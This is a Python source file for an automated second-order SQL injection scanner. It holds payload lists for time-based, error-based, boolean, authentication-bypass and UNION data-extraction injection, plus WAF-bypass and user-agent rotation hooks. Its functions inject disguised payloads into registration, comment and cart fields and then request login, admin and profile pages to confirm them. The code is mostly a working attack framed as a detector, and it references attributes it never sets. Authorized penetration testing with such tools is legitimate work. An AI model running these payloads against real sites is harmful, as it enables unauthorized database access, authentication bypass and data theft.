# second_order.py
# Advanced second-order SQL injection detector with persistent attack detection

import time
import requests
import urllib3
import random
import re
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Optional, Union, Any
import json
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
from datetime import datetime, timedelta

# Import your modules
from user_agents import AdvancedUserAgentRotator
from payload_generator import BasicDetectionPayloads, AdvancedDetectionPayloads, EnhancedPayloadGenerator
from bypass import AdvancedWAFBypass, SmartWAFBypass, generate_smart_bypass_payloads
from time_based import AdvancedTimeBasedDetector
from error_based import AdvancedErrorBasedDetector
from boolean_based import AdvancedBooleanBasedDetector

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration / constants ------------------------------------------------
DEFAULT_SAMPLE_SIZE = 3
DEFAULT_CONFIDENCE_THRESHOLD = 0.8
MAX_PARALLEL_PAYLOADS = 4
DEFAULT_DELAY = 1.0
DEFAULT_WAIT_TIME = 5  # Wait time for second-order effects

# Detection modes
DETECTION_MODES = {
    'basic': 'Basic second-order payloads only',
    'basic_bypass': 'Basic payloads + WAF bypass',
    'advanced': 'Advanced second-order scenarios',
    'advanced_bypass': 'Advanced scenarios + WAF bypass'
}

# Second-order injection scenarios
SCENARIOS = {
    'user_registration': {
        'description': 'Inject during registration, trigger during login/profile',
        'injection_points': ['username', 'email', 'name', 'password'],
        'trigger_points': ['login', 'profile', 'search']
    },
    'comment_system': {
        'description': 'Inject in comments, trigger in admin panel',
        'injection_points': ['comment', 'name', 'email'],
        'trigger_points': ['admin', 'moderate', 'view']
    },
    'search_function': {
        'description': 'Inject in search, trigger in search history',
        'injection_points': ['query', 'search', 'q'],
        'trigger_points': ['history', 'recent', 'saved']
    },
    'shopping_cart': {
        'description': 'Inject in cart, trigger in order processing',
        'injection_points': ['product_id', 'quantity', 'notes'],
        'trigger_points': ['checkout', 'order', 'invoice']
    },
    'file_upload': {
        'description': 'Inject in metadata, trigger in file listing',
        'injection_points': ['filename', 'description', 'tags'],
        'trigger_points': ['gallery', 'list', 'browse']
    },
    'profile_update': {
        'description': 'Inject in profile, trigger in user listing',
        'injection_points': ['bio', 'location', 'website'],
        'trigger_points': ['users', 'members', 'directory']
    }
}

# Second-order payload templates
SECOND_ORDER_PAYLOADS = {
    'time_based_delayed': [
        "admin' AND SLEEP(5)--",
        "admin' WAITFOR DELAY '0:0:5'--",
        "admin' AND PG_SLEEP(5)--",
        "admin' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))--"
    ],
    'error_based': [
        "admin' AND 1=CONVERT(int,@@version)--",
        "admin' AND EXTRACTVALUE(1,CONCAT(0x3a,@@version))--",
        "admin' AND 1=CAST((SELECT version()) AS INTEGER)--"
    ],
    'boolean_based': [
        "admin' AND 1=1--",
        "admin' AND '1'='1",
        "admin' OR '1'='1'--",
        "admin' AND database() = database()--"
    ],
    'authentication_bypass': [
        "admin'--",
        "admin'/*",
        "admin'#",
        "admin' OR '1'='1",
        "admin' UNION SELECT 1,2,3--"
    ],
    'data_extraction': [
        "test' UNION SELECT @@version,2,3--",
        "test' UNION SELECT user(),2,3--",
        "test' UNION SELECT database(),2,3--"
    ]
}

# --- Helper utilities --------------------------------------------------------
def generate_second_order_payload(base_payload: str, context: str = 'generic') -> str:
    """Generate context-appropriate second-order payload."""
    # Make payloads look more natural for their context
    if context == 'user_registration':
        prefixes = ['admin', 'user', 'test', 'demo', 'guest']
        return f"{random.choice(prefixes)}{base_payload}"
    elif context == 'comment_system':
        prefixes = ['Great post! ', 'Interesting. ', 'I agree. ', '']
        return f"{random.choice(prefixes)}{base_payload}"
    elif context == 'search_function':
        prefixes = ['test', 'hello', 'search', 'find']
        return f"{random.choice(prefixes)}{base_payload}"
    else:
        return base_payload

def calculate_payload_fingerprint(payload: str) -> str:
    """Calculate fingerprint for payload tracking."""
    return hashlib.md5(payload.encode()).hexdigest()[:8]

def detect_second_order_indicators(response_text: str, original_payload: str) -> Dict[str, Any]:
    """Detect indicators of successful second-order injection."""
    indicators = {
        'payload_reflection': False,
        'database_errors': False,
        'unexpected_content': False,
        'authentication_bypass': False,
        'data_leakage': False,
        'confidence': 0.0
    }
    
    # Check for payload reflection
    if original_payload in response_text:
        indicators['payload_reflection'] = True
        indicators['confidence'] += 0.3
    
    # Check for database errors
    error_patterns = [
        r"SQL.*error", r"Database.*error", r"Syntax.*error",
        r"MySQL.*error", r"PostgreSQL.*error", r"ORA-[0-9]+",
        r"Warning.*mysql", r"Unclosed.*quotation", r"Microsoft.*SQL"
    ]
    
    for pattern in error_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            indicators['database_errors'] = True
            indicators['confidence'] += 0.4
            break
    
    # Check for authentication bypass indicators
    bypass_indicators = [
        'Welcome admin', 'Login successful', 'Dashboard',
        'Administrator', 'Privileged access'
    ]
    
    for indicator in bypass_indicators:
        if indicator.lower() in response_text.lower():
            indicators['authentication_bypass'] = True
            indicators['confidence'] += 0.5
    
    # Check for unexpected data leakage
    leakage_patterns = [
        r"version.*[0-9]\.[0-9]", r"database.*[a-zA-Z]",
        r"user.*@", r"table.*[a-zA-Z]", r"column.*[a-zA-Z]"
    ]
    
    for pattern in leakage_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            indicators['data_leakage'] = True
            indicators['confidence'] += 0.3
    
    # Check for unexpected content changes
    if len(response_text) > 1000 and indicators['confidence'] > 0:
        indicators['unexpected_content'] = True
        indicators['confidence'] += 0.1
    
    return indicators

# --- Enhanced HTTP Session ---------------------------------------------------
class ResilientHTTPSession:
    """HTTP session with retry logic and connection pooling."""
    
    def __init__(self, max_retries: int = 3, backoff_factor: float = 0.5):
        self.session = requests.Session()
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self._setup_session()
    
    def _setup_session(self):
        """Configure session with retry strategy."""
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=self.backoff_factor,
            status_forcelist=[429, 500, 502, 503, 504, 403],
            allowed_methods=["GET", "POST"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Default headers
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with enhanced error handling."""
        # Ensure verify=False for SSL
        kwargs['verify'] = False
        kwargs['timeout'] = kwargs.get('timeout', 30)
        kwargs['allow_redirects'] = kwargs.get('allow_redirects', False)
        
        return self.session.request(method, url, **kwargs)
    
    def close(self):
        """Close session."""
        self.session.close()

# --- Second-Order Attack Manager ---------------------------------------------
class SecondOrderAttackManager:
    """Manage second-order injection attacks and trigger detection."""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.attack_sessions = {}
        self.results = {}
        
    def register_attack(self, attack_id: str, injection_point: str, 
                       payload: str, scenario: str, target_url: str):
        """Register a second-order attack attempt."""
        self.attack_sessions[attack_id] = {
            'injection_point': injection_point,
            'payload': payload,
            'payload_fingerprint': calculate_payload_fingerprint(payload),
            'scenario': scenario,
            'target_url': target_url,
            'injection_time': datetime.now(),
            'trigger_attempts': [],
            'status': 'injected'
        }
    
    def record_trigger_attempt(self, attack_id: str, trigger_url: str, 
                             response_data: Dict[str, Any]):
        """Record trigger attempt and results."""
        if attack_id in self.attack_sessions:
            attempt = {
                'trigger_url': trigger_url,
                'timestamp': datetime.now(),
                'response_data': response_data,
                'indicators': detect_second_order_indicators(
                    response_data.get('text', ''),
                    self.attack_sessions[attack_id]['payload']
                )
            }
            
            self.attack_sessions[attack_id]['trigger_attempts'].append(attempt)
            
            # Update status if successful
            if attempt['indicators']['confidence'] > 0.5:
                self.attack_sessions[attack_id]['status'] = 'confirmed'
    
    def get_attack_results(self, attack_id: str) -> Dict[str, Any]:
        """Get results for a specific attack."""
        if attack_id in self.attack_sessions:
            session = self.attack_sessions[attack_id]
            return {
                'attack_id': attack_id,
                'status': session['status'],
                'payload': session['payload'],
                'scenario': session['scenario'],
                'trigger_attempts': session['trigger_attempts'],
                'successful_triggers': [
                    attempt for attempt in session['trigger_attempts']
                    if attempt['indicators']['confidence'] > 0.5
                ]
            }
        return {}
    
    def get_all_results(self) -> Dict[str, Any]:
        """Get results for all attacks."""
        return {
            'total_attacks': len(self.attack_sessions),
            'successful_attacks': len([
                a for a in self.attack_sessions.values() 
                if a['status'] == 'confirmed'
            ]),
            'attack_sessions': self.attack_sessions
        }

# --- Main Detector -----------------------------------------------------------
class AdvancedSecondOrderDetector:
    """
    Advanced Second-Order SQL Injection Detector.
    """

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.sample_size = self.config.get('sample_size', DEFAULT_SAMPLE_SIZE)
        self.confidence_threshold = self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD)
        self.wait_time = self.config.get('wait_time', DEFAULT_WAIT_TIME)
        self.max_payloads_per_scenario = self.config.get('max_payloads_per_scenario', 10)
        self.detection_mode = self.config.get('detection_mode', 'advanced_bypass')
        self.use_smart_bypass = self.config.get('use_smart_bypass', False)
        self.payloads_directory = self.config.get('payloads_directory', 'payloads')

        # Initialize components
        self._initialize_components()
        
        # HTTP session
        self.http_session = ResilientHTTPSession(
            max_retries=self.config.get('max_retries', 3),
            backoff_factor=self.config.get('backoff_factor', 0.5)
        )

        # Attack manager
        self.attack_manager = SecondOrderAttackManager()

        # Internal state
        self.request_history: List[Dict[str, Any]] = []
        self.scenario_responses: Dict[str, List] = {}
        self.learning_data = []

        # Logging
        self.logger = self._setup_logging()
        self.logger.info(f"Initialized second-order detector with mode: {self.detection_mode}")

    def _initialize_components(self):
        """Initialize detection components based on selected mode."""
        # Always initialize these
        self.ua_rotator = AdvancedUserAgentRotator()
        self.waf_bypass = AdvancedWAFBypass()
        self.smart_bypass = SmartWAFBypass() if self.use_smart_bypass else None
        
        # Initialize payload sources based on mode
        if self.detection_mode in ['basic', 'basic_bypass']:
            self.payload_source = BasicDetectionPayloads()
            self.advanced_payloads = None
            self.payload_generator = None
        else:
            self.payload_source = BasicDetectionPayloads()  # Fallback
            self.advanced_payloads = AdvancedDetectionPayloads(self.payloads_directory)
            self.payload_generator = EnhancedPayloadGenerator(
                use_bypass=(self.detection_mode == 'advanced_bypass'),
                payloads_directory=self.payloads_directory,
                smart_learning=self.use_smart_bypass
            )

    def _setup_logging(self):
        logger = logging.getLogger('AdvancedSecondOrderDetector')
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    # ----------------- Payload Management -------------------
    def _collect_second_order_payloads(self, scenario: str) -> List[Dict[str, Any]]:
        """Collect second-order payloads for specific scenario."""
        payloads = []
        
        if self.detection_mode in ['basic', 'basic_bypass']:
            payloads = self._get_basic_second_order_payloads(scenario)
        else:
            payloads = self._get_advanced_second_order_payloads(scenario)
        
        # Apply bypass if enabled in mode
        if self.detection_mode in ['basic_bypass', 'advanced_bypass']:
            payloads = self._apply_bypass_to_payloads(payloads)
        
        return payloads[:self.max_payloads_per_scenario]

    def _get_basic_second_order_payloads(self, scenario: str) -> List[Dict[str, Any]]:
        """Get basic second-order payloads."""
        payloads = []
        
        # Get scenario-specific injection points
        scenario_info = SCENARIOS.get(scenario, SCENARIOS['user_registration'])
        context = scenario
        
        for payload_type, payload_list in SECOND_ORDER_PAYLOADS.items():
            for base_payload in payload_list[:3]:  # Limit per type
                payload_text = generate_second_order_payload(base_payload, context)
                
                payloads.append({
                    'payload': payload_text,
                    'payload_type': payload_type,
                    'scenario': scenario,
                    'base_confidence': 0.7,
                    'description': f"{scenario} {payload_type}",
                    'source': 'basic'
                })
        
        return payloads

    def _get_advanced_second_order_payloads(self, scenario: str) -> List[Dict[str, Any]]:
        """Get advanced second-order payloads."""
        payloads = []
        
        if not self.advanced_payloads:
            return self._get_basic_second_order_payloads(scenario)
        
        # Get second-order specific payloads
        second_order_payloads = self.advanced_payloads.get_payloads_by_attack_type('second_order')
        
        for category, payload_list in second_order_payloads.items():
            for p in payload_list:
                if any(keyword in p.lower() for keyword in ['admin', 'user', 'comment', 'search']):
                    payload_text = generate_second_order_payload(p, scenario)
                    payloads.append({
                        'payload': payload_text,
                        'payload_type': 'advanced',
                        'scenario': scenario,
                        'base_confidence': 0.8,
                        'description': f"Advanced {category}",
                        'source': 'advanced'
                    })
        
        # Add basic payloads as fallback
        if not payloads:
            payloads = self._get_basic_second_order_payloads(scenario)
        
        return payloads

    def _apply_bypass_to_payloads(self, original_payloads: List[Dict]) -> List[Dict]:
        """Apply WAF bypass techniques to payloads."""
        bypassed_payloads = []
        
        for original in original_payloads[:8]:  # Limit for performance
            raw_payload = original['payload']
            
            # Apply smart bypass if enabled
            if self.use_smart_bypass and self.smart_bypass:
                try:
                    smart_variants = self.smart_bypass.get_optimized_bypass(raw_payload, self.waf_bypass)
                    for variant in smart_variants[:2]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'payload_type': original['payload_type'],
                            'scenario': original['scenario'],
                            'base_confidence': original['base_confidence'] * 0.95,
                            'description': original['description'] + ' (smart bypass)',
                            'source': original['source'] + '_bypass'
                        })
                except Exception as e:
                    self.logger.debug(f"Smart bypass failed: {e}")
            
            # Apply standard bypass techniques
            try:
                bypass_variants = self.waf_bypass.apply_all_bypasses(raw_payload, max_variations=2)
                for variant in bypass_variants:
                    if variant not in [p['payload'] for p in bypassed_payloads]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'payload_type': original['payload_type'],
                            'scenario': original['scenario'],
                            'base_confidence': original['base_confidence'] * 0.9,
                            'description': original['description'] + ' (bypass)',
                            'source': original['source'] + '_bypass'
                        })
            except Exception as e:
                self.logger.debug(f"Standard bypass failed: {e}")
        
        # Combine original and bypassed payloads
        all_payloads = original_payloads + bypassed_payloads
        
        # Deduplicate
        seen = set()
        deduped = []
        for pl in all_payloads:
            if pl['payload'] not in seen:
                deduped.append(pl)
                seen.add(pl['payload'])
        
        return deduped

    # ----------------- HTTP Communication -------------------
    def _prepare_headers(self, headers: Optional[Dict[str,str]] = None) -> Dict[str,str]:
        """Prepare headers with User-Agent rotation."""
        headers = (headers or {}).copy()
        if 'User-Agent' not in headers:
            ua = self.ua_rotator.get_user_agent()
            headers['User-Agent'] = ua
        return headers

    def _send_request(self, url: str, method: str = 'GET', headers: Dict = None, 
                     data: Any = None, cookies: Dict = None, safe_mode: bool = False, 
                     timeout: Optional[int] = None) -> Tuple[bool, str, int, str]:
        """Send HTTP request with comprehensive error handling."""
        if timeout is None:
            timeout = self.max_response_time

        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        start = time.time()

        try:
            if method.upper() == 'GET':
                resp = self.http_session.request('GET', url, headers=headers, cookies=cookies, timeout=timeout)
            elif method.upper() == 'POST':
                ct = headers.get('Content-Type', '')
                if 'application/json' in ct and isinstance(data, (dict, list)):
                    payload = json.dumps(data)
                    resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=payload, timeout=timeout)
                else:
                    resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=data, timeout=timeout)
            else:
                resp = self.http_session.request(method, url, headers=headers, cookies=cookies, data=data, timeout=timeout)

            response_text = resp.text
            rt = time.time() - start
            
            if not safe_mode:
                self.request_history.append({
                    'timestamp': datetime.now(),
                    'response_time': rt,
                    'status_code': resp.status_code,
                    'url': url
                })
                
                # Collect learning data for smart bypass
                if self.use_smart_bypass:
                    self.learning_data.append((url, resp.status_code, resp.text))

            return True, response_text, resp.status_code, resp.headers.get('Content-Type', '')
            
        except requests.exceptions.Timeout:
            rt = time.time() - start
            self.logger.debug(f"Request timeout after {rt:.2f}s: {url}")
            return False, "Timeout", 0, ""
        except requests.RequestException as e:
            rt = time.time() - start
            self.logger.debug(f"Request failed: {e}")
            return False, str(e), 0, ""
        except Exception as e:
            rt = time.time() - start
            self.logger.debug(f"Unexpected error: {e}")
            return False, str(e), 0, ""

    # ----------------- Injection Helpers -------------------
    def _build_injection_request(self, url: str, method: str, headers: Dict, 
                               data: Any, parameter: str, payload: str) -> Tuple[str, str, Dict, Any]:
        """Build injection request with payload."""
        test_url = url
        test_method = method
        test_headers = headers.copy()
        test_data = data.copy() if hasattr(data, 'copy') else data

        if method.upper() == 'GET':
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            query_params[parameter] = [payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            content_type = test_headers.get('Content-Type', '')
            
            if 'application/json' in content_type:
                if isinstance(test_data, str):
                    try:
                        json_data = json.loads(test_data)
                        if parameter in json_data:
                            json_data[parameter] = payload
                        test_data = json.dumps(json_data)
                    except json.JSONDecodeError:
                        test_data = test_data.replace(f'"{parameter}"', f'"{payload}"')
                else:
                    if parameter in test_data:
                        test_data[parameter] = payload
                    
            elif isinstance(test_data, dict):
                test_data[parameter] = payload
                
            elif isinstance(test_data, str):
                test_data = test_data.replace(f"{parameter}=", f"{parameter}={payload}")

        return test_url, test_method, test_headers, test_data

    # ----------------- Second-Order Attack Execution -------------------
    def execute_second_order_attack(self, scenario: str, injection_target: Dict[str, Any], 
                                  trigger_targets: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Execute complete second-order attack scenario."""
        self.logger.info(f"Executing second-order attack scenario: {scenario}")
        
        # Get payloads for this scenario
        payloads = self._collect_second_order_payloads(scenario)
        scenario_info = SCENARIOS.get(scenario, SCENARIOS['user_registration'])
        
        attack_results = {
            'scenario': scenario,
            'injection_target': injection_target,
            'trigger_targets': trigger_targets,
            'payloads_tested': [],
            'successful_attacks': []
        }
        
        for payload_info in payloads:
            payload = payload_info['payload']
            attack_id = f"{scenario}_{calculate_payload_fingerprint(payload)}"
            
            self.logger.info(f"Testing payload: {payload[:50]}...")
            
            # Step 1: Inject payload
            injection_success = self._perform_injection(
                attack_id, injection_target, payload_info, scenario_info
            )
            
            if injection_success:
                # Step 2: Wait for potential storage/processing
                self.logger.info(f"Waiting {self.wait_time}s for second-order effect...")
                time.sleep(self.wait_time)
                
                # Step 3: Trigger potential second-order execution
                trigger_results = self._trigger_second_order(
                    attack_id, trigger_targets, payload
                )
                
                # Analyze results
                attack_analysis = self._analyze_second_order_attack(attack_id, payload_info)
                
                if attack_analysis['confidence'] >= self.confidence_threshold:
                    attack_results['successful_attacks'].append(attack_analysis)
                
                attack_results['payloads_tested'].append({
                    'payload': payload,
                    'injection_success': injection_success,
                    'trigger_results': trigger_results,
                    'analysis': attack_analysis
                })
            
            # Be nice to the server
            time.sleep(self.delay)
        
        attack_results['total_payloads'] = len(attack_results['payloads_tested'])
        attack_results['successful_count'] = len(attack_results['successful_attacks'])
        
        return attack_results

    def _perform_injection(self, attack_id: str, injection_target: Dict[str, Any], 
                         payload_info: Dict[str, Any], scenario_info: Dict[str, Any]) -> bool:
        """Perform the initial injection."""
        url = injection_target['url']
        method = injection_target.get('method', 'POST')
        headers = injection_target.get('headers', {})
        data = injection_target.get('data', {})
        cookies = injection_target.get('cookies', {})
        
        # Try different injection points
        injection_points = scenario_info['injection_points']
        successful_injection = False
        
        for parameter in injection_points:
            if parameter in url or (isinstance(data, dict) and parameter in data):
                test_url, test_method, test_headers, test_data = self._build_injection_request(
                    url, method, headers, data, parameter, payload_info['payload']
                )
                
                ok, response_text, status_code, _ = self._send_request(
                    test_url, test_method, test_headers, test_data, cookies
                )
                
                if ok and status_code in [200, 201, 302]:
                    # Register successful injection
                    self.attack_manager.register_attack(
                        attack_id, parameter, payload_info['payload'], 
                        payload_info['scenario'], url
                    )
                    successful_injection = True
                    self.logger.info(f"Successfully injected into parameter: {parameter}")
                    break
        
        return successful_injection

    def _trigger_second_order(self, attack_id: str, trigger_targets: List[Dict[str, Any]], 
                            payload: str) -> List[Dict[str, Any]]:
        """Trigger potential second-order execution points."""
        trigger_results = []
        
        for trigger_target in trigger_targets:
            url = trigger_target['url']
            method = trigger_target.get('method', 'GET')
            headers = trigger_target.get('headers', {})
            data = trigger_target.get('data', {})
            cookies = trigger_target.get('cookies', {})
            
            ok, response_text, status_code, content_type = self._send_request(
                url, method, headers, data, cookies
            )
            
            if ok:
                response_data = {
                    'text': response_text,
                    'status_code': status_code,
                    'content_type': content_type,
                    'url': url
                }
                
                # Record trigger attempt
                self.attack_manager.record_trigger_attempt(attack_id, url, response_data)
                
                # Analyze response for second-order indicators
                indicators = detect_second_order_indicators(response_text, payload)
                
                trigger_results.append({
                    'trigger_url': url,
                    'response_data': response_data,
                    'indicators': indicators,
                    'is_triggered': indicators['confidence'] > 0.3
                })
                
                if indicators['confidence'] > 0.3:
                    self.logger.info(f"Potential second-order trigger at: {url} (confidence: {indicators['confidence']:.2f})")
        
        return trigger_results

    def _analyze_second_order_attack(self, attack_id: str, payload_info: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze second-order attack results."""
        attack_results = self.attack_manager.get_attack_results(attack_id)
        
        if not attack_results:
            return {'confidence': 0.0, 'successful': False}
        
        # Calculate overall confidence
        confidence = 0.0
        successful_triggers = attack_results.get('successful_triggers', [])
        
        if successful_triggers:
            # Use maximum confidence from successful triggers
            max_trigger_confidence = max(
                trigger['indicators']['confidence'] 
                for trigger in successful_triggers
            )
            confidence = max_trigger_confidence * payload_info['base_confidence']
        
        # Additional factors
        if len(successful_triggers) > 1:
            confidence *= 1.2  # Multiple successful triggers
        
        if attack_results['status'] == 'confirmed':
            confidence = min(1.0, confidence * 1.3)
        
        return {
            'attack_id': attack_id,
            'payload': payload_info['payload'],
            'scenario': payload_info['scenario'],
            'confidence': confidence,
            'successful': confidence >= self.confidence_threshold,
            'successful_triggers': successful_triggers,
            'total_trigger_attempts': len(attack_results.get('trigger_attempts', [])),
            'payload_type': payload_info.get('payload_type', 'unknown')
        }

    # ----------------- Scanning Methods -------------------
    def comprehensive_scan(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """Perform comprehensive second-order injection scan."""
        self.logger.info(f"Starting comprehensive second-order scan for {target.get('url')}")
        
        scan_results = {
            'target': target,
            'scenarios_tested': [],
            'vulnerabilities_found': [],
            'scan_start': datetime.now()
        }
        
        # Test all scenarios
        for scenario_name, scenario_info in SCENARIOS.items():
            self.logger.info(f"Testing scenario: {scenario_name}")
            
            # Create injection and trigger targets based on scenario
            injection_target, trigger_targets = self._create_scenario_targets(target, scenario_name)
            
            if injection_target and trigger_targets:
                scenario_results = self.execute_second_order_attack(
                    scenario_name, injection_target, trigger_targets
                )
                
                scan_results['scenarios_tested'].append(scenario_results)
                
                if scenario_results['successful_count'] > 0:
                    scan_results['vulnerabilities_found'].extend(
                        scenario_results['successful_attacks']
                    )
        
        scan_results['scan_duration'] = (datetime.now() - scan_results['scan_start']).total_seconds()
        scan_results['vulnerability_count'] = len(scan_results['vulnerabilities_found'])
        scan_results['scenarios_count'] = len(scan_results['scenarios_tested'])
        
        self._generate_scan_summary(scan_results)
        return scan_results

    def _create_scenario_targets(self, base_target: Dict[str, Any], scenario: str) -> Tuple[Dict[str, Any], List[Dict[str, Any]]]:
        """Create injection and trigger targets for a scenario."""
        base_url = base_target['url']
        parsed_url = urlparse(base_url)
        base_path = parsed_url.path
        
        scenario_info = SCENARIOS.get(scenario, SCENARIOS['user_registration'])
        
        # Create injection target
        injection_target = base_target.copy()
        
        # Create trigger targets based on scenario
        trigger_targets = []
        
        for trigger_point in scenario_info['trigger_points']:
            trigger_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            if scenario == 'user_registration':
                if trigger_point == 'login':
                    trigger_url += '/login' if base_path == '/' else f"{base_path}/login"
                elif trigger_point == 'profile':
                    trigger_url += '/profile' if base_path == '/' else f"{base_path}/profile"
                elif trigger_point == 'search':
                    trigger_url += '/search' if base_path == '/' else f"{base_path}/search"
            
            elif scenario == 'comment_system':
                if trigger_point == 'admin':
                    trigger_url += '/admin' if base_path == '/' else f"{base_path}/admin"
                elif trigger_point == 'moderate':
                    trigger_url += '/moderate' if base_path == '/' else f"{base_path}/moderate"
                elif trigger_point == 'view':
                    trigger_url += '/comments' if base_path == '/' else f"{base_path}/comments"
            
            # Add more scenario-specific trigger URLs...
            
            trigger_target = {
                'url': trigger_url,
                'method': 'GET',
                'headers': base_target.get('headers', {}),
                'cookies': base_target.get('cookies', {})
            }
            trigger_targets.append(trigger_target)
        
        return injection_target, trigger_targets

    def targeted_scan(self, target: Dict[str, Any], specific_scenarios: List[str] = None) -> Dict[str, Any]:
        """Perform targeted second-order scan for specific scenarios."""
        scenarios_to_test = specific_scenarios or ['user_registration', 'comment_system']
        
        self.logger.info(f"Starting targeted second-order scan for scenarios: {', '.join(scenarios_to_test)}")
        
        scan_results = {
            'target': target,
            'scenarios_tested': [],
            'vulnerabilities_found': [],
            'scan_start': datetime.now()
        }
        
        for scenario_name in scenarios_to_test:
            if scenario_name in SCENARIOS:
                self.logger.info(f"Testing scenario: {scenario_name}")
                
                injection_target, trigger_targets = self._create_scenario_targets(target, scenario_name)
                
                if injection_target and trigger_targets:
                    scenario_results = self.execute_second_order_attack(
                        scenario_name, injection_target, trigger_targets
                    )
                    
                    scan_results['scenarios_tested'].append(scenario_results)
                    
                    if scenario_results['successful_count'] > 0:
                        scan_results['vulnerabilities_found'].extend(
                            scenario_results['successful_attacks']
                        )
        
        scan_results['scan_duration'] = (datetime.now() - scan_results['scan_start']).total_seconds()
        scan_results['vulnerability_count'] = len(scan_results['vulnerabilities_found'])
        
        self._generate_scan_summary(scan_results)
        return scan_results

    def _generate_scan_summary(self, scan_results: Dict[str, Any]):
        """Generate comprehensive scan summary."""
        self.logger.info("=" * 60)
        self.logger.info("SECOND-ORDER SQL INJECTION SCAN SUMMARY")
        self.logger.info(f"Target: {scan_results['target'].get('url')}")
        self.logger.info(f"Scenarios tested: {len(scan_results['scenarios_tested'])}")
        self.logger.info(f"Vulnerabilities found: {scan_results['vulnerability_count']}")
        self.logger.info(f"Scan duration: {scan_results.get('scan_duration', 0):.2f}s")
        
        if scan_results['vulnerability_count'] > 0:
            self.logger.info("Vulnerable scenarios:")
            for vuln in scan_results['vulnerabilities_found']:
                self.logger.info(f"  - {vuln['scenario']} (confidence: {vuln['confidence']:.3f})")
                self.logger.info(f"    Payload: {vuln['payload'][:60]}...")
                self.logger.info(f"    Successful triggers: {len(vuln['successful_triggers'])}")
        
        self.logger.info("=" * 60)

    def close(self):
        """Clean up resources."""
        self.http_session.close()

# Convenience functions
def run_second_order_scan(target_config: Dict[str, Any], scan_type: str = 'comprehensive',
                         detector_config: Dict[str, Any] = None,
                         specific_scenarios: List[str] = None) -> Dict[str, Any]:
    """
    Run second-order SQL injection scan.
    
    Args:
        target_config: Target configuration
        scan_type: Type of scan ('comprehensive', 'targeted')
        detector_config: Detector configuration
        specific_scenarios: List of specific scenarios to test
    
    Returns:
        Scan results
    """
    detector = AdvancedSecondOrderDetector(detector_config or {})
    
    try:
        if scan_type == 'comprehensive':
            return detector.comprehensive_scan(target_config)
        elif scan_type == 'targeted':
            return detector.targeted_scan(target_config, specific_scenarios)
        else:
            raise ValueError(f"Unknown scan type: {scan_type}")
    
    finally:
        detector.close()

def get_available_scenarios():
    """Get available second-order scenarios."""
    return SCENARIOS

def get_scenario_info(scenario_name: str) -> Dict[str, Any]:
    """Get detailed information about a specific scenario."""
    return SCENARIOS.get(scenario_name, {})

